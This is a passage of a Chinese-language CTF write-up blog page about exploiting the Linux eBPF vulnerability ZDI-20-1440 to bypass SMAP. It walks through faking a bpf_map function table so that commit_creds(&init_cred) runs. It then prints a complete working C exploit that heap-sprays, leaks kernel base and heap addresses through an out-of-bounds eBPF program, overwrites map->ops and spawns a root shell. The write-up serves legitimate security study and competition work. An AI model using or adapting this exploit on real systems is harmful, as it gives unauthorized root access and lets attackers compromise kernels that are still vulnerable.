<span class="hljs-attr">0xffff88000e320a10:</span>     <span class="hljs-number">0x0000000100000100</span>      <span class="hljs-number">0x0000000100000000</span>
<span class="hljs-attr">0xffff88000e320a20:</span>     <span class="hljs-number">0x0000000000000001</span>      <span class="hljs-number">0x0000000000000000</span>
<span class="hljs-attr">0xffff88000e320a30:</span>     <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span>
<span class="hljs-attr">0xffff88000e320a40:</span>     <span class="hljs-number">0xffff88000e2aca80</span>      <span class="hljs-number">0x0000000100000002</span>
<span class="hljs-attr">0xffff88000e320a50:</span>     <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span>
<span class="hljs-attr">0xffff88000e320a60:</span>     <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span>
<span class="hljs-attr">0xffff88000e320a70:</span>     <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span>
<span class="hljs-attr">0xffff88000e320a80:</span>     <span class="hljs-number">0x0000000000000100</span>      <span class="hljs-number">0x0000000000000000</span>
<span class="hljs-attr">0xffff88000e320a90:</span>     <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span></code><button class="copy-btn copy-btn-light" data-clipboard-snippet=""><i class="iconfont icon-copy"></i><span>Copy</span></button></pre></div>

<p>但很可惜的是它指向存放其他 size chunk 的 page，由於 kernel heap randomization，我們無法從該 pointer 反推到目前可控的這個 page 的 address，不過實際上也不難，只要想辦法拿到在同一個 page 下的 free chunk 上的 fd pointer 就可以了</p>
<p>為了確保 exploit 在 leak kernel heap 的穩定性，我的做法是先利用 <code>struct msg_msg</code> 做 heap spray，讓 exploit 最開始透過 <code>bpf_create_map()</code> allocate 兩個 bpf map (更準確來說是 <code>struct bpf_array</code>) 時，總是會分配到幾乎未被使用過的 page 上，這樣便可以穩定地從後方 free chunk 上的 fd pointer leak 出同一個 page 下的地址</p>
<p>有了 heap address 就可以在 bpf map 上偽造 function table 了，但問題是我們該跳哪些 function 呢？</p>
<p>因為執行這些 function 時 <code>rdi</code> 會指向 <code>struct bpf_map</code>，我的想法是透過控制一些參數，直接利用原本就是操作 bpf map 的 function 去達成任意寫</p>
<p>我的第一個想法是既然我們都可以複寫整個 <code>struct bpf_array</code> 的內容了，那就利用像是 <code>array_map_update_elem</code> 中的 <code>memcpy</code>，只要控制好 <code>array-&gt;elem_size</code> 跟 <code>index</code> 不就可以寫到任意地址上了嗎？</p>
<div class="hljs"><pre><code class="hljs cpp"><span class="hljs-comment">/* Called from syscall or from eBPF program */</span>
<span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">array_map_update_elem</span><span class="hljs-params">(struct bpf_map *<span class="hljs-built_in">map</span>, <span class="hljs-keyword">void</span> *key, <span class="hljs-keyword">void</span> *value,
				 u64 map_flags)</span>
            <span class="hljs-comment">// ...</span>

            <span class="hljs-title">memcpy</span><span class="hljs-params">(<span class="hljs-built_in">array</span>-&gt;value +
                <span class="hljs-built_in">array</span>-&gt;elem_size * (index &amp; <span class="hljs-built_in">array</span>-&gt;index_mask),
                value, <span class="hljs-built_in">map</span>-&gt;value_size)</span></span>;

            <span class="hljs-comment">// ...</span></code><button class="copy-btn copy-btn-light" data-clipboard-snippet=""><i class="iconfont icon-copy"></i><span>Copy</span></button></pre></div>

<p>結果寫完 exploit 我才發現原來大多數的 offset 都只有 <code>int</code> 的大小，不夠我偽造任意 kernel address…</p>
<p>接著又想到說，因為目標只是執行 <code>commit_creds(prepare_kernel_cred(0))</code>，如果可以先把某個 function 換成 <code>prepare_kernel_cred</code> 然後控制好 <code>rdi = 0</code> 並記錄下返回值，接下來只要重做一次並把 <code>rdi</code> 控制成剛剛的返回值就可以提權了吧？</p>
<p>但是在我尋尋覓覓之後，發現大多數 function 都是回傳 <code>int</code>，回傳指標的 function 通常也會在這之後對其進行操作，所以不能用；同時對 <code>rdi</code> 的控制雖然有 <code>bpf_fd_array_map_update_elem</code> 和 <code>fd_array_map_delete_elem</code> 兩個 function 可以利用，但執行後卻不會返回任何值，而且 <code>rdi</code> 還得要不為零才能觸發，所以肯定不能利用這兩個函數呼叫 <code>prepare_kernel_cred(0)</code></p>
<div class="hljs"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">fd_array_map_delete_elem</span><span class="hljs-params">(struct bpf_map *<span class="hljs-built_in">map</span>, <span class="hljs-keyword">void</span> *key)</span>
</span>{
	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_array</span> *<span class="hljs-title">array</span> = <span class="hljs-title">container_of</span>(<span class="hljs-title">map</span>, <span class="hljs-title">struct</span> <span class="hljs-title">bpf_array</span>, <span class="hljs-title">map</span>);</span>
	<span class="hljs-keyword">void</span> *old_ptr;
	u32 index = *(u32 *)key;

	<span class="hljs-keyword">if</span> (index &gt;= <span class="hljs-built_in">array</span>-&gt;<span class="hljs-built_in">map</span>.max_entries)
		<span class="hljs-keyword">return</span> -E2BIG;

	old_ptr = xchg(<span class="hljs-built_in">array</span>-&gt;ptrs + index, <span class="hljs-literal">NULL</span>); <span class="hljs-comment">// 從 array 上拿取資料並置零，old_ptr 可控</span>
	<span class="hljs-keyword">if</span> (old_ptr) {
		<span class="hljs-built_in">map</span>-&gt;ops-&gt;map_fd_put_ptr(old_ptr); <span class="hljs-comment">// 若資料非零則呼叫 function table 上另一個 callback</span>
		<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
	} <span class="hljs-keyword">else</span> {
		<span class="hljs-keyword">return</span> -ENOENT;
	}
}</code><button class="copy-btn copy-btn-light" data-clipboard-snippet=""><i class="iconfont icon-copy"></i><span>Copy</span></button></pre></div>

<p>看到這裡的時候，因為我一直不清楚 <code>prepare_kernel_cred(0)</code> 中的參數 <code>0</code> 是指什麼，想說若是有辦法繞過那至少有點機會 (雖然依舊拿不到 return 的 cred)，所以特別去翻了一下他的實作細節</p>
<div class="hljs"><pre><code class="hljs cpp"><span class="hljs-function">struct cred *<span class="hljs-title">prepare_kernel_cred</span><span class="hljs-params">(struct task_struct *daemon)</span>
</span>{
    <span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cred</span> *<span class="hljs-title">old</span>;</span>
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cred</span> *<span class="hljs-title">new</span>;</span>

    <span class="hljs-keyword">new</span> = kmem_cache_alloc(cred_jar, GFP_KERNEL);
    <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">new</span>)
        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;

    kdebug(<span class="hljs-string">"prepare_kernel_cred() alloc %p"</span>, <span class="hljs-keyword">new</span>);

    <span class="hljs-keyword">if</span> (daemon)
        old = get_task_cred(daemon);
    <span class="hljs-keyword">else</span>
        old = get_cred(&amp;init_cred); <span class="hljs-comment">// &lt;----</span>

    validate_creds(old);
    
    *<span class="hljs-keyword">new</span> = *old;
    
    <span class="hljs-comment">// ...</span>
    
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span>;
    
    <span class="hljs-comment">// ...</span>
}</code><button class="copy-btn copy-btn-light" data-clipboard-snippet=""><i class="iconfont icon-copy"></i><span>Copy</span></button></pre></div>

<p>雖然看到傳入的參數是個指標時，心都涼了一半，但我很快地發現當參數傳入零的時候，他會透過 <code>get_cred(&amp;init_cred)</code> 去取得一個看上去應該有著極高權限的 cred，接著將他賦值給 <code>new</code> 後先做了一些操作，緊接著就在不遠處將其返回…!!!</p>
<p>讀者們讀到這應該也會發現，要提權其實只需要執行一次 function call: <code>commit_creds(&amp;init_cred)</code> 即可 (我是第一次知道這件事XD)，於是最後我的 exploit 流程如下:</p>
<ol>
<li>偽造 function table 並將 <code>map-&gt;ops</code> 指過去</li>
<li>在偽造的 function table 中<ul>
<li>以 <code>fd_array_map_delete_elem</code> 換掉 <code>map_delete_elem</code></li>
<li>以 <code>commit_creds</code> 換掉 <code>map_fd_put_ptr</code></li>
</ul>
</li>
<li>透過呼叫 <code>bpf_update_elem()</code> 把 <code>&amp;init_cred</code> 放上 bpf map</li>
<li>呼叫 <code>bpf_delete_elem()</code> 提權</li>
<li>get root shell :)</li>
</ol>
<p>公布一下沒人拿到的 flag: <code>AIS3{jibun_no_1_day_exploit_de_root_shell_wo_shutoku_suru_no_ha_omoshiroi_peko_jan?}</code></p>
<p>最終的 exploit (完整的放在這裡 <a href="https://github.com/HexRabbit/CTF-writeup/blob/master/2021/eofctf/dayone/exp/smap_exp.c" target="_blank" rel="noopener">smap.c</a>): </p>
<div class="hljs"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdint.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stddef.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;errno.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/mman.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/socket.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/ipc.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/types.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/msg.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">"bpf.h"</span></span>

<span class="hljs-keyword">char</span> buffer[<span class="hljs-number">64</span>];
<span class="hljs-keyword">int</span> sockets[<span class="hljs-number">2</span>];
<span class="hljs-keyword">int</span> ctrl_mapfd;
<span class="hljs-keyword">int</span> vuln_mapfd;
<span class="hljs-keyword">size_t</span> ctrlmap_ptr;
<span class="hljs-keyword">size_t</span> vulnmap_ptr;
<span class="hljs-keyword">size_t</span> leakbuf[<span class="hljs-number">0x100</span>];
<span class="hljs-keyword">size_t</span> ctrlbuf[<span class="hljs-number">0x100</span>];
<span class="hljs-keyword">size_t</span> kbase;
<span class="hljs-keyword">size_t</span> pivot_esp;

<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">message</span> {</span>
    <span class="hljs-keyword">long</span> type;
    <span class="hljs-keyword">char</span> text[<span class="hljs-number">0x800</span>];
} msg;

<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">msg_alloc</span><span class="hljs-params">(<span class="hljs-keyword">int</span> id, <span class="hljs-keyword">int</span> size)</span>
</span>{
  <span class="hljs-keyword">if</span> (msgsnd(id, (<span class="hljs-keyword">void</span> *)&amp;msg, size - <span class="hljs-number">0x30</span>, IPC_NOWAIT) &lt; <span class="hljs-number">0</span>) {
    perror(strerror(errno));
    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
  }
}

<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">heap_spray</span><span class="hljs-params">()</span>
</span>{
  <span class="hljs-keyword">int</span> msqid;
  msg.type = <span class="hljs-number">1</span>;

  <span class="hljs-keyword">if</span> ((msqid = msgget(IPC_PRIVATE, <span class="hljs-number">0644</span> | IPC_CREAT)) &lt; <span class="hljs-number">0</span>) {
    perror(strerror(errno));
    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
  }

  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x13</span>; ++i) {
    msg_alloc(msqid, <span class="hljs-number">0x200</span>);
  }
}

<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">get_shell</span><span class="hljs-params">()</span> </span>{
  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"[*] get shell\n"</span>);
  system(<span class="hljs-string">"sh"</span>);
}

<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">update_elem_ctrl</span><span class="hljs-params">()</span>
</span>{
  <span class="hljs-keyword">int</span> key = <span class="hljs-number">0</span>;
  <span class="hljs-keyword">if</span> (bpf_update_elem(ctrl_mapfd, &amp;key, ctrlbuf, <span class="hljs-number">0</span>)) {
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"bpf_update_elem failed '%s'\n"</span>, strerror(errno));
  }
}

<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">get_elem_ctrl</span><span class="hljs-params">()</span>
</span>{
  <span class="hljs-keyword">int</span> key = <span class="hljs-number">0</span>;
  <span class="hljs-keyword">if</span> (bpf_lookup_elem(ctrl_mapfd, &amp;key, leakbuf)) {
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"bpf_lookup_elem failed '%s'\n"</span>, strerror(errno));
  }
}

<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">debugmsg</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span>
</span>{
  <span class="hljs-keyword">char</span> buffer[<span class="hljs-number">64</span>];
  <span class="hljs-keyword">ssize_t</span> n = write(sockets[<span class="hljs-number">0</span>], buffer, <span class="hljs-keyword">sizeof</span>(buffer));

  <span class="hljs-keyword">if</span> (n &lt; <span class="hljs-number">0</span>) {
    perror(<span class="hljs-string">"write"</span>);
    <span class="hljs-keyword">return</span>;
  }
  <span class="hljs-keyword">if</span> (n != <span class="hljs-keyword">sizeof</span>(buffer))
    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"short write: %lu\n"</span>, n);
}

<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">load_prog</span><span class="hljs-params">()</span>
</span>{
  <span class="hljs-comment">// make bpf_map alloc to new page, in order to leak heap pointer stablly</span>
  heap_spray();

  <span class="hljs-comment">// size == 0x100, useful to set data on bpfarray</span>
  ctrl_mapfd = bpf_create_map(BPF_MAP_TYPE_ARRAY, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>), <span class="hljs-number">0x100</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);
  <span class="hljs-keyword">if</span> (ctrl_mapfd &lt; <span class="hljs-number">0</span>) {
    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"failed to create map1"</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;
  }

  <span class="hljs-comment">// size*count should be the same as ctrl_map</span>
  vuln_mapfd = bpf_create_map(BPF_MAP_TYPE_ARRAY, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>), <span class="hljs-number">0x100</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);
  <span class="hljs-keyword">if</span> (vuln_mapfd &lt; <span class="hljs-number">0</span>) {
    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"failed to create map2"</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;
  }

  <span class="hljs-comment">// sizeof(struct bpf_array) == 0x200</span>
  <span class="hljs-comment">// offset of bpf_array.value == 0x90</span>
  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_insn</span> <span class="hljs-title">prog</span>[] = {</span>
    <span class="hljs-comment">// DW == 8bytes</span>
    BPF_GET_MAP(ctrl_mapfd, <span class="hljs-number">0</span>),
    BPF_LDX_MEM(BPF_DW, BPF_REG_8, BPF_REG_0, <span class="hljs-number">0</span>),
    BPF_LDX_MEM(BPF_DW, BPF_REG_9, BPF_REG_0, <span class="hljs-number">8</span>),
    BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_0, <span class="hljs-number">0x10</span>),
    BPF_MOV64_REG(BPF_REG_7, BPF_REG_0),

    BPF_ST_MEM(BPF_W, BPF_REG_0, <span class="hljs-number">0</span>, <span class="hljs-number">0x41414141</span>),
    BPF_ST_MEM(BPF_W, BPF_REG_0, <span class="hljs-number">4</span>, <span class="hljs-number">0x41414141</span>),

    BPF_JMP_IMM(BPF_JGE, BPF_REG_8, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>),
    BPF_JMP_IMM(BPF_JA, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">9</span>), <span class="hljs-comment">// goto exit</span>
    BPF_JMP_IMM(BPF_JGE, BPF_REG_8, <span class="hljs-number">0x1000</span>, <span class="hljs-number">8</span>),

    BPF_JMP_IMM(BPF_JGE, BPF_REG_9, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>),
    BPF_JMP_IMM(BPF_JA, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>), <span class="hljs-comment">// goto exit</span>
    BPF_JMP_IMM(BPF_JGE, BPF_REG_9, <span class="hljs-number">0x400</span>, <span class="hljs-number">5</span>),

    BPF_ALU64_REG(BPF_RSH, BPF_REG_8, BPF_REG_9), <span class="hljs-comment">// r8 &gt;&gt;= r9</span>
    BPF_ALU64_REG(BPF_ADD, BPF_REG_0, BPF_REG_8), <span class="hljs-comment">// r0 += r8</span>

    <span class="hljs-comment">// switch leak / write</span>
    BPF_JMP_IMM(BPF_JNE, BPF_REG_6, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>),

    <span class="hljs-comment">// leak</span>
    BPF_LDX_MEM(BPF_DW, BPF_REG_4, BPF_REG_0, <span class="hljs-number">0</span>), <span class="hljs-comment">// r4 = *r0</span>
    BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_4, <span class="hljs-number">0x10</span>), <span class="hljs-comment">// *r6 = r4</span>
    BPF_MOV64_IMM(BPF_REG_0, <span class="hljs-number">0</span>),
    BPF_EXIT_INSN(),

    <span class="hljs-comment">// write</span>
    BPF_STX_MEM(BPF_DW, BPF_REG_0, BPF_REG_6, <span class="hljs-number">0</span>), <span class="hljs-comment">// *r0 = r6</span>
    BPF_MOV64_IMM(BPF_REG_0, <span class="hljs-number">0</span>),
    BPF_EXIT_INSN(),
  };
  <span class="hljs-keyword">return</span> bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER, prog, <span class="hljs-keyword">sizeof</span>(prog) / <span class="hljs-keyword">sizeof</span>(struct bpf_insn), <span class="hljs-string">"GPL"</span>);
}

<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">infoleak</span><span class="hljs-params">()</span>
</span>{
  update_elem_ctrl();
  debugmsg();
  get_elem_ctrl();
  debugmsg();
}

<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">overwrite_array_ops</span><span class="hljs-params">()</span> </span>{
  <span class="hljs-keyword">int</span> n = <span class="hljs-number">0</span>;
  <span class="hljs-keyword">int</span> key = <span class="hljs-number">0</span>;
  <span class="hljs-keyword">size_t</span> init_cred = kbase + <span class="hljs-number">0xe43e60</span>;
  <span class="hljs-keyword">size_t</span> fd_array_map_delete_elem = kbase + <span class="hljs-number">0x12b730</span>;
  <span class="hljs-keyword">size_t</span> commit_creds = kbase + <span class="hljs-number">0x81e70</span>;

  <span class="hljs-comment">// prepare fake array_ops</span>
  ctrlbuf[n++] = <span class="hljs-number">0x170</span> * <span class="hljs-number">2</span>; <span class="hljs-comment">// offset to bpf_array-&gt;map-&gt;ops</span>
  ctrlbuf[n++] = <span class="hljs-number">1</span>;
  ctrlbuf[n++] = ctrlmap_ptr + <span class="hljs-number">0x90</span> + <span class="hljs-number">0x18</span>; <span class="hljs-comment">// ebpf code will overwrite bpf_array-&gt;map-&gt;ops with this ptr</span>

  ctrlbuf[n++] = <span class="hljs-number">0x4141414141414141</span>;        <span class="hljs-comment">// point to here</span>
  ctrlbuf[n++] = <span class="hljs-number">0x4241414141414141</span>;
  ctrlbuf[n++] = <span class="hljs-number">0x4341414141414141</span>;
  ctrlbuf[n++] = <span class="hljs-number">0x4441414141414141</span>;
  ctrlbuf[n++] = <span class="hljs-number">0x4541414141414141</span>;
  ctrlbuf[n++] = <span class="hljs-number">0x4641414141414141</span>;
  ctrlbuf[n++] = fd_array_map_delete_elem;  <span class="hljs-comment">// map_delete_elem</span>
  ctrlbuf[n++] = <span class="hljs-number">0x4841414141414141</span>;
  ctrlbuf[n++] = commit_creds;              <span class="hljs-comment">// map_fd_put_ptr</span>

  <span class="hljs-comment">// put elem on vuln_map</span>
  bpf_update_elem(vuln_mapfd, &amp;key, &amp;init_cred, <span class="hljs-number">0</span>);
  debugmsg();

  <span class="hljs-comment">// overwrite vulnmap-&gt;ops</span>
  update_elem_ctrl();
  debugmsg();

  <span class="hljs-comment">// fd_array_map_delete_elem call map-&gt;map_fd_put_ptr(first_elem) = commit_creds(&amp;init_cred)</span>
  bpf_delete_elem(vuln_mapfd, &amp;key);
  debugmsg();

  get_shell();
}

<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{
  <span class="hljs-keyword">int</span> progfd = load_prog();

  <span class="hljs-keyword">if</span> (progfd &lt; <span class="hljs-number">0</span>) {
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"log:\n%s"</span>, bpf_log_buf);
    <span class="hljs-keyword">if</span> (errno == EACCES)
      <span class="hljs-built_in">printf</span>(<span class="hljs-string">"failed to load prog '%s'\n"</span>, strerror(errno));
  }

  <span class="hljs-keyword">if</span> (socketpair(AF_UNIX, SOCK_DGRAM, <span class="hljs-number">0</span>, sockets)) {
    strerror(errno);
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
  }

  <span class="hljs-keyword">if</span> (setsockopt(sockets[<span class="hljs-number">1</span>], SOL_SOCKET, SO_ATTACH_BPF, &amp;progfd, <span class="hljs-keyword">sizeof</span>(progfd)) &lt; <span class="hljs-number">0</span>) {
    strerror(errno);
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
  }

  ctrlbuf[<span class="hljs-number">0</span>] = <span class="hljs-number">0x170</span> * <span class="hljs-number">2</span>;
  ctrlbuf[<span class="hljs-number">1</span>] = <span class="hljs-number">1</span>;
  infoleak();

  kbase = leakbuf[<span class="hljs-number">2</span>] - <span class="hljs-number">0xa12100</span>;
  pivot_esp = kbase + <span class="hljs-number">0x6ec938</span>;
  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"[+] leak kernel kbase: 0x%lx\n"</span>, kbase);

  ctrlbuf[<span class="hljs-number">0</span>] = <span class="hljs-number">0x570</span> * <span class="hljs-number">2</span>;
  ctrlbuf[<span class="hljs-number">1</span>] = <span class="hljs-number">1</span>;
  infoleak();

  ctrlmap_ptr = leakbuf[<span class="hljs-number">2</span>] - <span class="hljs-number">0x800</span>;
  vulnmap_ptr = ctrlmap_ptr + <span class="hljs-number">0x200</span>;
  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"[+] leak kernel heap: 0x%lx\n"</span>, ctrlmap_ptr);

  overwrite_array_ops();
}</code><button class="copy-btn copy-btn-light" data-clipboard-snippet=""><i class="iconfont icon-copy"></i><span>Copy</span></button></pre></div>


            </article>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                
                  <div class="post-meta">
                    <i class="iconfont icon-tags"></i>
                    
                      <a class="hover-with-bg" href="https://blog.hexrabbit.io/tags/pwnable/">pwnable</a>
                    
                      <a class="hover-with-bg" href="https://blog.hexrabbit.io/tags/kernel-exploit/">kernel exploit</a>
                    
                      <a class="hover-with-bg" href="https://blog.hexrabbit.io/tags/ebpf/">ebpf</a>
                    
                  </div>
                
              </div>
              
              
                <div class="post-prevnext row">
                  <div class="post-prev col-6">
                    
                    
                      <a href="https://blog.hexrabbit.io/2021/11/03/CVE-2021-34866-writeup/">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">CVE-2021-34866 Writeup</span>
                        <span class="visible-mobile">Previous</span>
                      </a>
                    
                  </div>
                  <div class="post-next col-6">
                    
                    
                      <a href="https://blog.hexrabbit.io/2020/08/25/Google-CTF-2020-sprint-Writeup/">
                        <span class="hidden-mobile">Google CTF 2020 - Sprint Writeup</span>
                        <span class="visible-mobile">Next</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </div>
                </div>
              
            </div>

            
              <!-- Comments -->
              <div class="comments" id="comments">
                
                
  <div class="disqus" style="width:100%">
    <div id="disqus_thread"></div>
    <script type="text/javascript">
      function loadDisqus() {
        var disqus_config = function () {
          this.page.url = 'https://blog.hexrabbit.io/2021/02/07/ZDI-20-1440-writeup/';
          this.page.identifier = '/2021/02/07/ZDI-20-1440-writeup/';
        };
        (function () {
          var d = document,
            s = d.createElement('script');
          s.src = '//' + 'hexrabbit' + '.disqus.com/embed.js';
          s.setAttribute('data-timestamp', new Date());
          (d.head || d.body).appendChild(s);
        })();
      }
      createObserver(loadDisqus, 'disqus_thread');
    </script>
    <noscript>Please enable JavaScript to view the
      <a href="https://disqus.com/?ref_noscript" rel="nofollow noopener">comments powered by Disqus.</a>
    </noscript>
  </div>


              </div>
            
          </div>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn" style="padding-top: 0px;">
        <div id="toc" style="visibility: visible;">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
  <div id="tocbot"><ol class="tocbot-list "><li class="toc-list-item is-active-li"><a href="https://blog.hexrabbit.io/2021/02/07/ZDI-20-1440-writeup/#%E9%A1%8C%E7%9B%AE%E7%B0%A1%E4%BB%8B" class="tocbot-link node-name--H2  tocbot-active-link">題目簡介</a></li><li class="toc-list-item"><a href="https://blog.hexrabbit.io/2021/02/07/ZDI-20-1440-writeup/#%E5%88%9D%E8%A6%8B" class="tocbot-link node-name--H2 ">初見</a></li><li class="toc-list-item"><a href="https://blog.hexrabbit.io/2021/02/07/ZDI-20-1440-writeup/#extended-Berkeley-Packet-Filter-eBPF" class="tocbot-link node-name--H2 ">extended Berkeley Packet Filter (eBPF)</a></li><li class="toc-list-item"><a href="https://blog.hexrabbit.io/2021/02/07/ZDI-20-1440-writeup/#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0" class="tocbot-link node-name--H2 ">漏洞成因</a></li><li class="toc-list-item"><a href="https://blog.hexrabbit.io/2021/02/07/ZDI-20-1440-writeup/#PoC" class="tocbot-link node-name--H2 ">PoC</a></li><li class="toc-list-item"><a href="https://blog.hexrabbit.io/2021/02/07/ZDI-20-1440-writeup/#Exploit" class="tocbot-link node-name--H2 ">Exploit</a><ol class="tocbot-list  tocbot-is-collapsible tocbot-is-collapsed"><li class="toc-list-item"><a href="https://blog.hexrabbit.io/2021/02/07/ZDI-20-1440-writeup/#smep" class="tocbot-link node-name--H3 ">+smep</a></li><li class="toc-list-item"><a href="https://blog.hexrabbit.io/2021/02/07/ZDI-20-1440-writeup/#smap" class="tocbot-link node-name--H3 ">+smap</a></li></ol></li></ol></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->


    
  </main>

  
    <a id="scroll-top-button" href="https://blog.hexrabbit.io/2021/02/07/ZDI-20-1440-writeup/#" role="button" style="bottom: -60px; right: 219.35px;">
      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
    </a>
  

  
    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">×</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">keyword</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
  

  

  

  <footer class="mt-5">
  <div class="text-center py-3">
    <div>
      <a href="https://hexo.io/" target="_blank" rel="nofollow noopener"><span>Hexo</span></a>
      <i class="iconfont icon-love"></i>
      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener">
        <span>Fluid</span></a>
    </div>
    

    

    
  </div>
</footer>

<!-- SCRIPTS -->
<script src="./2021 - ZDI-20-1440 Writeup_files/jquery.min.js.下載"></script>
<script src="./2021 - ZDI-20-1440 Writeup_files/bootstrap.min.js.下載"></script>
<script src="./2021 - ZDI-20-1440 Writeup_files/debouncer.js.下載"></script>
<script src="./2021 - ZDI-20-1440 Writeup_files/main.js.下載"></script>

<!-- Plugins -->


  
    <script src="./2021 - ZDI-20-1440 Writeup_files/lazyload.js.下載"></script>
  



  <script defer="" src="./2021 - ZDI-20-1440 Writeup_files/clipboard.min.js.下載"></script>
  <script src="./2021 - ZDI-20-1440 Writeup_files/clipboard-use.js.下載"></script>







  <script src="./2021 - ZDI-20-1440 Writeup_files/tocbot.min.js.下載"></script>
  <script>
    $(document).ready(function () {
      var boardCtn = $('#board-ctn');
